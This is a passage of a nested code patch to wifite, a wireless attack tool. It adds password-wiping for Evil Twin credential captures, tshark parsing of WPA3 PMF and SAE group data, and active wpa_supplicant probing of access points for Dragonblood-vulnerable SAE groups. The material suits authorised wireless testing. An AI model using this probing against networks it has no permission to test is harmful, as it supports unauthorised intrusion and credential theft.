+-        
+-        if 'eta' in progress:
+-            msg_parts.append('{C}ETA:{W} {G}%s{W}' % progress['eta'])
+-        
+-        if 'recovered' in progress and 'total_hashes' in progress:
+-            msg_parts.append('{C}Recovered:{W} {G}%d{W}/{C}%d{W}' % 
+-                           (progress['recovered'], progress['total_hashes']))
+-        
+-        if msg_parts:
+-            Color.pl('{+} ' + ' | '.join(msg_parts))
+-    
+     @staticmethod
+     def check_dependencies() -> Dict[str, bool]:
+         """
+diff --git a/wifite/util/session.py b/wifite/util/session.py
+index 58b5d16ac..d6eec2deb 100755
+--- a/wifite/util/session.py
++++ b/wifite/util/session.py
+@@ -52,21 +52,27 @@ class EvilTwinClientState:
+ @dataclass
+ class EvilTwinCredentialAttempt:
+     """Represents a credential submission attempt in an Evil Twin attack."""
+-    
++
+     mac_address: str
+     password: str
+     success: bool
+     timestamp: float
+-    
++
+     def to_dict(self) -> Dict[str, Any]:
+         """Convert to dictionary for JSON serialization."""
+         return asdict(self)
+-    
++
+     @classmethod
+     def from_dict(cls, data: Dict[str, Any]) -> 'EvilTwinCredentialAttempt':
+         """Create EvilTwinCredentialAttempt from dictionary."""
+         return cls(**data)
+ 
++    def clear_password(self):
++        """Overwrite password in memory to prevent credential leakage."""
++        if self.password:
++            self.password = '\x00' * len(self.password)
++            self.password = ''
++
+ 
+ @dataclass
+ class EvilTwinAttackState:
+@@ -117,12 +123,20 @@ class EvilTwinAttackState:
+             'validation_time': self.validation_time
+         }
+     
++    def clear_credentials(self):
++        """Overwrite all credential data in memory to prevent leakage."""
++        if self.captured_password:
++            self.captured_password = '\x00' * len(self.captured_password)
++            self.captured_password = None
++        for attempt in self.credential_attempts:
++            attempt.clear_password()
++
+     @classmethod
+     def from_dict(cls, data: Dict[str, Any]) -> 'EvilTwinAttackState':
+         """Create EvilTwinAttackState from dictionary."""
+         clients = [EvilTwinClientState.from_dict(c) for c in data.get('clients', [])]
+         attempts = [EvilTwinCredentialAttempt.from_dict(a) for a in data.get('credential_attempts', [])]
+-        
++
+         return cls(
+             interface_ap=data.get('interface_ap'),
+             interface_deauth=data.get('interface_deauth'),
+diff --git a/wifite/util/wpa3.py b/wifite/util/wpa3.py
+index ee3a24967..c1894c4a3 100755
+--- a/wifite/util/wpa3.py
++++ b/wifite/util/wpa3.py
+@@ -9,21 +9,22 @@ of wireless networks, including transition mode detection, PMF status, and
+ Dragonblood vulnerability indicators.
+ """
+ 
++import os
+ from typing import Dict, List, Any, Optional
+ 
+ 
+ class WPA3Detector:
+     """
+     Detects and classifies WPA3-SAE capabilities of wireless targets.
+-    
+-    This class provides static methods to analyze target information and
+-    determine WPA3 support, transition mode, PMF status, and supported
+-    SAE groups.
+-    
+-    Performance optimizations:
+-    - Caches detection results in target.wpa3_info
+-    - Minimizes string operations and attribute access
+-    - Uses efficient parsing with early returns
++
++    Detection layers:
++    1. Heuristic parse of airodump's Privacy/Authentication CSV fields
++       (always available, but imprecise — can't tell PMF or SAE groups).
++    2. Beacon RSN IE parse via tshark when a capture file is available
++       — yields real PMF (MFPC/MFPR) bits and observed SAE groups from
++       any captured SAE Commit frames.
++
++    Results are cached in target.wpa3_info.
+     """
+ 
+     # PMF Status Constants
+@@ -33,55 +34,45 @@ class WPA3Detector:
+ 
+     # Known vulnerable SAE groups (Dragonblood)
+     VULNERABLE_SAE_GROUPS = [22, 23, 24]  # Groups susceptible to timing attacks
+-    
++
+     # Default SAE group (most common)
+     DEFAULT_SAE_GROUP = 19
+ 
++    # IEEE 802.11 AKM suite type for SAE
++    AKM_TYPE_SAE = 8
++
+     @staticmethod
+-    def detect_wpa3_capability(target, use_cache: bool = True) -> Dict[str, Any]:
++    def detect_wpa3_capability(target, use_cache: bool = True,
++                               capfile: Optional[str] = None) -> Dict[str, Any]:
+         """
+         Detect WPA3 capability from target beacon/probe response.
+-        
+-        Analyzes the target's encryption and authentication fields to determine
+-        WPA3 support, transition mode, PMF status, and other WPA3-related
+-        capabilities.
+-        
+-        Performance optimizations:
+-        - Returns cached results if available (unless use_cache=False)
+-        - Performs detection in single pass to minimize attribute access
+-        - Uses efficient string operations
+-        
++
+         Args:
+             target: Target object containing encryption and authentication info
+             use_cache: If True, return cached results from target.wpa3_info if available
+-            
++            capfile: Optional path to a pcap/pcapng file. When provided and
++                     tshark is available, beacon RSN IE bits are parsed for
++                     a precise PMF status and observed SAE groups.
++
+         Returns:
+-            Dictionary containing:
+-                - has_wpa3 (bool): True if WPA3 is supported
+-                - has_wpa2 (bool): True if WPA2 is supported
+-                - is_transition (bool): True if both WPA2 and WPA3 are supported
+-                - pmf_status (str): 'required', 'optional', or 'disabled'
+-                - sae_groups (List[int]): List of supported SAE groups
+-                - dragonblood_vulnerable (bool): True if vulnerable indicators detected
++            Dict with has_wpa3, has_wpa2, is_transition, pmf_status,
++            sae_groups, dragonblood_vulnerable.
+         """
+         # Return cached results if available and caching is enabled
+         if use_cache and hasattr(target, 'wpa3_info') and target.wpa3_info is not None:
+             return target.wpa3_info.to_dict()
+-        
+-        # Perform detection in a single pass to minimize overhead
+-        # Cache string values to avoid repeated attribute access
++
+         full_enc = getattr(target, 'full_encryption_string', '')
+         full_auth = getattr(target, 'full_authentication_string', '')
+         primary_enc = getattr(target, 'primary_encryption', '')
+         primary_auth = getattr(target, 'primary_authentication', '')
+-        
+-        # Check for WPA3 and WPA2 support using cached strings
+-        has_wpa3 = ('WPA3' in full_enc or primary_enc == 'WPA3' or 
++
++        # Heuristic pass from airodump's CSV fields
++        has_wpa3 = ('WPA3' in full_enc or primary_enc == 'WPA3' or
+                     'SAE' in full_auth or primary_auth == 'SAE')
+-        has_wpa2 = ('WPA2' in full_enc or primary_enc == 'WPA2' or 
++        has_wpa2 = ('WPA2' in full_enc or primary_enc == 'WPA2' or
+                     'PSK' in full_auth)
+-        
+-        # Early return for non-WPA3 targets to minimize overhead
++
+         if not has_wpa3:
+             return {
+                 'has_wpa3': False,
+@@ -91,25 +82,30 @@ class WPA3Detector:
+                 'sae_groups': [],
+                 'dragonblood_vulnerable': False
+             }
+-        
+-        # Determine if this is a transition mode network
++
+         is_transition = has_wpa2
+-        
+-        # Determine PMF status efficiently based on WPA3 mode
++
++        # Defaults from the heuristic layer
+         if is_transition:
+             pmf_status = WPA3Detector.PMF_OPTIONAL
+         else:
+-            # WPA3-only networks require PMF by specification
+             pmf_status = WPA3Detector.PMF_REQUIRED
+-        
+-        # Get supported SAE groups (default to Group 19 for WPA3 targets)
+-        sae_groups = [WPA3Detector.DEFAULT_SAE_GROUP]
+-        
+-        # Check for Dragonblood vulnerability
+-        # Only vulnerable groups 22-24 are susceptible
+-        dragonblood_vulnerable = any(g in WPA3Detector.VULNERABLE_SAE_GROUPS 
+-                                     for g in sae_groups)
+-        
++        sae_groups: List[int] = [WPA3Detector.DEFAULT_SAE_GROUP]
++
++        # Precise layer: parse real RSN/SAE data from a capture if we have one
++        bssid = getattr(target, 'bssid', None)
++        if capfile and bssid and os.path.isfile(capfile):
++            parsed = WPA3Detector._parse_rsn_from_capture(capfile, bssid)
++            if parsed:
++                if parsed.get('pmf_status'):
++                    pmf_status = parsed['pmf_status']
++                observed = parsed.get('sae_groups') or []
++                if observed:
++                    sae_groups = observed
++
++        dragonblood_vulnerable = any(
++            g in WPA3Detector.VULNERABLE_SAE_GROUPS for g in sae_groups)
++
+         return {
+             'has_wpa3': has_wpa3,
+             'has_wpa2': has_wpa2,
+@@ -119,6 +115,327 @@ class WPA3Detector:
+             'dragonblood_vulnerable': dragonblood_vulnerable
+         }
+ 
++    @staticmethod
++    def _parse_rsn_from_capture(capfile: str, bssid: str) -> Optional[Dict[str, Any]]:
++        """
++        Parse precise WPA3 details from a pcap/pcapng capture via tshark.
++
++        Returns:
++            {'pmf_status': 'required'|'optional'|'disabled'|None,
++             'sae_groups': [int, ...]}
++            or None if tshark is unavailable or the parse fails.
++        """
++        from ..tools.tshark import Tshark
++        if not Tshark.exists():
++            return None
++
++        result = {'pmf_status': None, 'sae_groups': []}
++        try:
++            result['pmf_status'] = WPA3Detector._parse_pmf_from_beacon(capfile, bssid)
++        except Exception:
++            pass
++        try:
++            result['sae_groups'] = WPA3Detector._parse_sae_groups_from_commits(capfile, bssid)
++        except Exception:
++            pass
++        if result['pmf_status'] is None and not result['sae_groups']:
++            return None
++        return result
++
++    @staticmethod
++    def _parse_pmf_from_beacon(capfile: str, bssid: str) -> Optional[str]:
++        """
++        Extract PMF status from the RSN IE in a beacon frame.
++
++        MFPR=1 → required; MFPC=1 & MFPR=0 → optional; MFPC=0 → disabled.
++        """
++        from ..util.process import Process
++        command = [
++            'tshark', '-r', capfile,
++            '-Y', 'wlan.bssid == %s && wlan.fc.type_subtype == 0x08' % bssid,
++            '-T', 'fields',
++            '-e', 'wlan.rsn.capabilities.mfpc',
++            '-e', 'wlan.rsn.capabilities.mfpr',
++            '-c', '1',
++        ]
++        stdout, _ = Process.call(command, timeout=15)
++        for line in (stdout or '').splitlines():
++            parts = line.strip().split('\t')
++            if len(parts) < 2:
++                continue
++            mfpc, mfpr = parts[0].strip(), parts[1].strip()
++            if mfpr in ('1', 'True'):
++                return WPA3Detector.PMF_REQUIRED
++            if mfpc in ('1', 'True'):
++                return WPA3Detector.PMF_OPTIONAL
++            if mfpc in ('0', 'False'):
++                return WPA3Detector.PMF_DISABLED
++        return None
++
++    @staticmethod
++    def _parse_sae_groups_from_commits(capfile: str, bssid: str) -> List[int]:
++        """
++        Extract SAE groups actually observed in SAE Commit frames.
++
++        Only works when the capture already contains SAE authentication
++        traffic (e.g. after a capture attempt or from archived handshakes).
++        SAE groups are NOT advertised in beacons — they're negotiated in
++        the Commit exchange.
++        """
++        from ..util.process import Process
++        command = [
++            'tshark', '-r', capfile,
++            '-Y', 'wlan.bssid == %s && wlan.fixed.auth.alg == 3' % bssid,
++            '-T', 'fields',
++            '-e', 'wlan.fixed.auth.sae.group',
++        ]
++        stdout, _ = Process.call(command, timeout=15)
++        seen = []
++        for line in (stdout or '').splitlines():
++            token = line.strip()
++            if not token:
++                continue
++            try:
++                group = int(token)
++            except ValueError:
++                continue
++            if group and group not in seen:
++                seen.append(group)
++        return seen
++
++    @staticmethod
++    def refresh_from_capture(target, capfile: str) -> bool:
++        """
++        Re-parse `target.wpa3_info` from a capture that (now) contains SAE frames.
++
++        Useful after an SAE capture attempt: the first scan-time detection
++        had no handshake, so sae_groups fell back to [19]. After capture,
++        we can extract the real negotiated group and make
++        is_dragonblood_vulnerable / is_timing_attack_viable accurate.
++
++        Returns True if any field changed.
++        """
++        if not capfile or not os.path.isfile(capfile):
++            return False
++        bssid = getattr(target, 'bssid', None)
++        if not bssid:
++            return False
++        parsed = WPA3Detector._parse_rsn_from_capture(capfile, bssid)
++        if not parsed:
++            return False
++
++        info = getattr(target, 'wpa3_info', None)
++        if info is None:
++            return False
++
++        changed = False
++        if parsed.get('pmf_status') and parsed['pmf_status'] != info.pmf_status:
++            info.pmf_status = parsed['pmf_status']
++            changed = True
++        if parsed.get('sae_groups') and parsed['sae_groups'] != info.sae_groups:
++            info.sae_groups = parsed['sae_groups']
++            new_vuln = any(g in WPA3Detector.VULNERABLE_SAE_GROUPS
++                           for g in info.sae_groups)
++            if new_vuln != info.dragonblood_vulnerable:
++                info.dragonblood_vulnerable = new_vuln
++            changed = True
++        return changed
++
++    # ------------------------------------------------------------------
++    # Active SAE group probing (Dragonblood companion)
++    # ------------------------------------------------------------------
++
++    # Common SAE groups worth probing. ECP groups (19/20/21) are the
++    # modern default; MODP groups (22/23/24) are the Dragonblood set.
++    DEFAULT_PROBE_GROUPS = [19, 20, 21, 22, 23, 24]
++
++    @staticmethod
++    def _channel_to_freq(channel: int) -> int:
++        if channel <= 13:
++            return 2407 + channel * 5
++        if channel == 14:
++            return 2484
++        return 5000 + channel * 5
++
++    @staticmethod
++    def _build_probe_config(bssid: str, essid: str, channel: int,
++                            sae_group: int, password: str) -> str:
++        """
++        Build a wpa_supplicant config body for a single SAE group probe.
++
++        Escapes ESSID/password so embedded quotes or backslashes don't
++        corrupt the config.  Shared by the active group-probe and the
++        Dragonblood timing attack so both agree on the format.
++        """
++        safe_essid = essid.replace('\\', '\\\\').replace('"', '\\"')
++        safe_password = password.replace('\\', '\\\\').replace('"', '\\"')
++        freq = WPA3Detector._channel_to_freq(channel)
++        lines = [
++            'ctrl_interface=/var/run/wpa_supplicant_wifite',
++            'ap_scan=1',
++            'fast_reauth=1',
++        ]
++        if sae_group:
++            lines.append(f'sae_groups={sae_group}')
++        lines.extend([
++            '',
++            'network={',
++            f'    ssid="{safe_essid}"',
++            f'    bssid={bssid}',
++            f'    sae_password="{safe_password}"',
++            '    key_mgmt=SAE',
++            '    ieee80211w=2',
++            f'    scan_freq={freq}',
++            '}',
++            '',
++        ])
++        return '\n'.join(lines)
++
++    @staticmethod
++    def probe_sae_groups_active(
++        interface: str,
++        bssid: str,
++        essid: str,
++        channel: int,
++        groups_to_probe: Optional[List[int]] = None,
++        per_group_timeout: int = 8,
++    ) -> Dict[int, str]:
++        """
++        Actively probe an AP to discover which SAE groups it accepts.
++
++        Sends one SAE Commit per candidate group via wpa_supplicant and
++        classifies the AP's response:
++          'accepted'    — AP replied with its own SAE Commit (group supported)
++          'rejected'    — AP returned status 77 (Unsupported Finite Cyclic Group)
++          'no_response' — no indicator observed within per_group_timeout
++
++        This gives us real SAE-group support data WITHOUT waiting for a
++        client to authenticate naturally. Companion to the passive
++        parsers in _parse_sae_groups_from_commits().
++
++        Requires:
++          * wpa_supplicant on PATH
++          * interface in managed mode (wpa_supplicant won't drive a
++            monitor-mode virtual interface). Caller is responsible for
++            mode toggling / restoration.
++          * root privileges
++
++        Args:
++            interface:    Wireless interface name (validated).
++            bssid:        Target BSSID.
++            essid:        Target ESSID (hidden ESSIDs not supported).
++            channel:      Target channel.
++            groups_to_probe: Groups to test. Default: ECP + MODP set.
++            per_group_timeout: Seconds to wait per group.
++
++        Returns:
++            Dict[int, str] mapping each probed group to a status. Empty
++            dict if wpa_supplicant is unavailable or the setup failed.
++        """
++        from ..config.validators import validate_interface_name
++        from ..util.process import Process
++        validate_interface_name(interface)
++
++        if not Process.exists('wpa_supplicant'):
++            return {}
++        if not essid:
++            # Without an ESSID, wpa_supplicant can't scan to the target.
++            return {}
++
++        if groups_to_probe is None:
++            groups_to_probe = list(WPA3Detector.DEFAULT_PROBE_GROUPS)
++
++        results: Dict[int, str] = {}
++        for group in groups_to_probe:
++            status = WPA3Detector._probe_single_sae_group(
++                interface, bssid, essid, channel, group, per_group_timeout)
++            results[group] = status
++        return results
++
++    @staticmethod
++    def _probe_single_sae_group(interface: str, bssid: str, essid: str,
++                                channel: int, sae_group: int,
++                                timeout: int) -> str:
++        """
++        Probe one SAE group. Returns 'accepted' / 'rejected' / 'no_response'.
++        """
++        import tempfile
++        import time
++        from ..config import Configuration
++        from ..util.process import Process
++
++        # A throwaway password. wpa_supplicant will compute a valid PWE
++        # from it; the AP reaches the commit-response step without us
++        # needing to know a real password.
++        probe_password = 'wifite-sae-probe-pw'
++
++        config_body = WPA3Detector._build_probe_config(
++            bssid=bssid, essid=essid, channel=channel,
++            sae_group=sae_group, password=probe_password)
++
++        fd, config_path = tempfile.mkstemp(
++            prefix='wifite_sae_probe_', suffix='.conf',
++            dir=Configuration.temp())
++        try:
++            os.write(fd, config_body.encode('utf-8'))
++            os.close(fd)
++            os.chmod(config_path, 0o600)
++
++            cmd = [
++                'wpa_supplicant',
++                '-i', interface,
++                '-c', config_path,
++                '-D', 'nl80211',
++                '-dd',
++            ]
++            proc = Process(cmd, devnull=False)
++
++            status = 'no_response'
++            deadline = time.monotonic() + timeout
++            try:
++                while time.monotonic() < deadline and proc.poll() is None:
++                    try:
++                        raw = proc.pid.stdout.readline()
++                    except Exception:
++                        time.sleep(0.05)
++                        continue
++                    if not raw:
++                        time.sleep(0.05)
++                        continue
++                    line = (raw.decode('utf-8', errors='replace')
++                            if isinstance(raw, bytes) else raw)
++
++                    # Explicit rejection: status 77 = Unsupported Finite
++                    # Cyclic Group. This is the cleanest negative signal.
++                    if ('status_code=77' in line
++                            or 'Unsupported finite cyclic group' in line
++                            or 'SAE: Unsupported group' in line):
++                        status = 'rejected'
++                        break
++
++                    # Positive signal: the AP replied with its own commit.
++                    # Seeing this means our group was accepted; whatever
++                    # happens after (password failure, status 15, etc.)
++                    # doesn't change the group-support answer.
++                    if ('SAE: Processing peer commit' in line
++                            or 'SAE: Peer commit' in line
++                            or 'SAE: Processing commit' in line):
++                        status = 'accepted'
++                        break
++            finally:
++                import contextlib
++                with contextlib.suppress(Exception):
++                    proc.interrupt()
++                    time.sleep(0.3)
++                    if proc.poll() is None:
++                        proc.kill()
++            return status
++        finally:
++            try:
++                os.remove(config_path)
++            except OSError:
++                pass
++
+     @staticmethod
+     def identify_transition_mode(target) -> bool:
+         """
